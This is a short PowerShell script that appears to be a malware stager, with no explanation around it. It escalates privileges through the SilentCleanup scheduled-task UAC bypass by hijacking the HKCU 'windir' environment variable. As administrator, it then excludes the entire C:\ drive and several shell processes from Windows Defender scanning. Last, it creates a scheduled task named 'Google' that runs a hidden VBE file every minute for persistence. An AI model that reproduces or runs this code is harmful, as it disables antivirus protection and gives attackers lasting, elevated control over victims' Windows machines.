

if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    #Payload goes here
    #It'll run as Administrator


Add-MpPreference -ExclusionPath  C:\

Add-MpPreference -ExclusionProcess powershell.exe
Add-MpPreference -ExclusionProcess Wscript.exe
Add-MpPreference -ExclusionProcess cmd.exe
Add-MpPreference -ExclusionProcess conhost.exe
Add-MpPreference -ExclusionProcess aspnet_compiler.exe





} else {
    $clay = "HKCU:\Environment"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
    Set-ItemProperty -Path $clay -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Remove-ItemProperty -Path $clay -Name $name
	
}

schtasks.exe /create /tn Google /sc minute  /st 00:10 /tr  C:\ProgramData\updata.vbe
